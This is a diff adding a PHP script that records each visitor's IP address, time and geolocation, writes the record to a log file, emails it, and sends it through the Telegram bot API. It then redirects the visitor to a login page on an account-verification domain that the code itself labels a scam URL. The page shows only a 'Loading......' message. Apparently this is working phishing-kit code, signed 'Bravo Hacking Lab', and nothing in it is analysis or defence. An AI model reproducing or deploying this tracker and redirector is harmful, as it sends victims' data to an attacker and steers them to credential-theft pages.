@@ -1,0 +1,55 @@
+<?php
+
+
+
+# ============= PHP API DEFINED ONLINE =================== #
+$ip = getenv("REMOTE_ADDR") . "\r\n";
+$date = gmdate ("Y/m/d") . "\r\n";
+$dateHis = gmdate ("H:i:sa") . "\r\n";
+
+ $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip"));
+ 
+ $countryName = $geo["geoplugin_countryName"] . "\r\n"; # COUNTRY-NAME #
+ $city = $geo["geoplugin_city"] . "\r\n"; #  CITY #
+ $region = $geo["geoplugin_regionName"] . "\r\n"; # STATE #
+ $regionCode = $geo["geoplugin_regionCode"] . "\r\n"; # STATE CODE #
+ $zipcode = $geo["geoplugin_areaCode"] . "\r\n";
+#---------------------------------------#
+
+$seen = "\n Your link was click From :\n".$ip."Date : ".$date. "Timer : ".$dateHis."Country : ".$countryName."City : ".$city. "State : ".$region."Region : ".$regionCode. "Zipcode : ".$zipcode;
+
+ # ========= To TXT FILE ================ #
+$flogs = fopen("newVisitor.txt","a");
+fwrite($flogs, $seen);
+fclose($flogs);
+# ========================= #
+
+# ========= To Email ================ #
+ include("visitorEmail.php");
+ $subject = "[You have got a new visitor! From]-".$countryName."$ip";
+ $headers = 'Bravo Hacking Lab';  
+ @mail($to_email,$subject,$seen,$headers);
+ # ========================= #
+
+# ========= To TELEGRAM =========== #
+file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($seen)."" );
+# ========================= #
+
+$scammurl = "https://accountverificationj.rf.gd/scorexxxx/login.php";
+
+exit(header("Location:$scammurl"));
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url=https://accountverificationj.rf.gd/scorexxxx/login.php">
+    <title></title>
+</head>
+<body>
+    <P>Loading......</P>
+</body>
+</html>
